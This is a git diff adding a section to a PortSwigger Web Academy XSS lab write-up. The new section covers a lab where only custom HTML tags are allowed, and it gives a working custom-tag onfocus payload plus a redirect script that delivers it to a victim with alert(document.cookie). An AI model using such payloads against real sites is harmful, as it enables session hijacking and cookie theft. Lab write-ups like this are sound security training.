@@ -30,6 +30,7 @@ This post is dedicated to XSS related Labs at [Portswigger Web Academy](https://
 - [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
 - [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
 - [Reflected XSS into HTML context with most tags and attributes blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
+- [Reflected XSS into HTML context with all tags blocked except custom ones](#reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
 
 # Finding a XSS
 
@@ -204,3 +205,21 @@ Payload:
 ```
 
 ![picture 4](/assets/images/f1786e7fe0dd8264c8cfe68f8607bc5607a0d6edcfe3418df5028cfb176a7d5b.png)  
+
+# Reflected XSS into HTML context with all tags blocked except custom ones
+> This lab blocks all HTML tags except custom ones.
+> 
+> To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
+
+For this lab we need custom tags. Portswigger has a great [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) for that: 
+
+Worked for me:
+`<xss autofocus tabindex=1 onfocus=alert(1)></xss>`
+
+Deliver the payload to the victim using the exploit server.
+
+```html
+<script>
+location = 'https://0ab4004c046a1cd880762c14003c005d.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>';
+</script>
+```
